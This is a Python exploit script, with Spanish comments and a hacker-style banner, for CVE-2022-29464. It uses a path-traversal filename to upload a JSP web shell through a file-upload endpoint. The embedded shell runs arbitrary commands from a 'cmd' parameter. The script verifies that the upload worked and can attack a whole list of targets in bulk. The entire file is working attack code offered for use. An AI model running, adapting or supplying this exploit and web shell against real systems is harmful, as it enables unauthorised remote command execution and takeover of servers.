import requests
import urllib3
import sys
import argparse
from colorama import Fore, Style, init
import re

# Inicializar colorama
init(autoreset=True)

# Colores
VERDE = Fore.GREEN
CIAN = Fore.CYAN
AZUL = Fore.BLUE
RESET = Style.RESET_ALL

# No mostrar mensaje de alerta por el SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Mostrar el banner
def mostrar_banner():
    print(f"{VERDE}#########################################################{RESET}")
    print(f"{CIAN}#                                                       #{RESET}")
    print(f"{VERDE}#           ████▓▒░  CVE-2022-29464  ░▒▓████          #{RESET}")
    print(f"{CIAN}#                                                       #{RESET}")
    print(f"{VERDE}#########################################################{RESET}")
    print(f"{AZUL}#             ▓▒░ Creado por: C1ph3rByt3               #{RESET}")
    print(f"{VERDE}#########################################################{RESET}")
    print()

# Verificar si el fichero fue subido exitosamente
def verify(host):
    """Verifica si el archivo fue subido con éxito."""
    try:
        req = requests.get(host, verify=False)
        return req.ok
    except Exception as e:
        print(f"[!] {Fore.RED}Error verificando {host}: {e}")
        return False

# Validar formato del host
def validar_host(host):
    """Valida que el host tenga el formato correcto."""
    patron = re.compile(r"^(?:[a-zA-Z0-9_\-\.]+|\d{1,3}(\.\d{1,3}){3}):\d+$")
    if not patron.match(host):
        print(f"{Fore.RED}[!] El host '{host}' no tiene el formato correcto. Use HOST:PUERTO o IP:PUERTO (e.g., 127.0.0.1:443 o google.com:854).{RESET}")
        sys.exit(1)

# Encargada de subir el archivo
def attack(target, filename):
    """Realiza el ataque subiendo el archivo al servidor vulnerable."""
    archivo = """<FORM>
    <INPUT name='cmd' type=text>
    <INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
String output = "";
if(cmd != null) {
    String s = null;
    try {
        Process p = Runtime.getRuntime().exec(cmd,null,null);
        BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
        while((s = sI.readLine()) != null) { output += s + "</br>"; }
    } catch(IOException e) { e.printStackTrace(); }
}
%>
<pre><%=output %></pre>"""

    try:
        # Ruta del archivo en el servidor
        path_archivo = f"https://{target}/authenticationendpoint/{filename}"

        # Subiendo el archivo al servidor
        files = {f"../../../../repository/deployment/server/webapps/authenticationendpoint/{filename}": archivo}
        print(f"{VERDE}[+] Intentando subir archivo a {target}...{RESET}")
        requests.post(f"https://{target}/fileupload/toolsAny", files=files, verify=False, timeout=10)

        # Verificar si el archivo fue subido
        if verify(path_archivo):
            print(f"{VERDE}[+] Archivo subido exitosamente: {path_archivo}{RESET}")
        else:
            print(f"{Fore.RED}[-] El servidor {target} no parece ser vulnerable.{RESET}")
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[-] Operación interrumpida por el usuario.{RESET}\n")
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}[-] Error atacando {target}: {e}{RESET}")

# Procesar una lista de objetivos
def procesar_lista(targets, filename):
    """Procesa la lista de objetivos para intentar subir el archivo."""
    try:
        with open(targets) as targets_file:
            for target in targets_file:
                target = target.strip()
                if target:
                    validar_host(target)
                    attack(target, filename)
    except FileNotFoundError:
        print(f"{Fore.RED}[!] Archivo {targets} no encontrado.{RESET}")
    except Exception as e:
        print(f"{Fore.RED}[!] Error procesando la lista de objetivos: {e}{RESET}")

# Procesar un solo host
def procesar_host(host, filename):
    """Procesa un host individual para intentar subir el archivo."""
    validar_host(host)
    attack(host, filename)

# Punto de entrada principal
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Exploit CVE-2022-29464 para subir un archivo en servidores vulnerables.")
    parser.add_argument("-f", "--file", help="Archivo con una lista de objetivos", type=str)
    parser.add_argument("-t", "--target", help="Un host individual para probar (formato: IP|HOST:PUERTO)", type=str)
    parser.add_argument("-j", "--jsp_file", help="Nombre del archivo JSP a subir", type=str, required=True)

    args = parser.parse_args()

    mostrar_banner()

    if args.file:
        procesar_lista(args.file, args.jsp_file)
    elif args.target:
        procesar_host(args.target, args.jsp_file)
    else:
        print(f"{Fore.YELLOW}[!] Debes proporcionar un archivo con -f o un host con -t.{RESET}")
        parser.print_help()
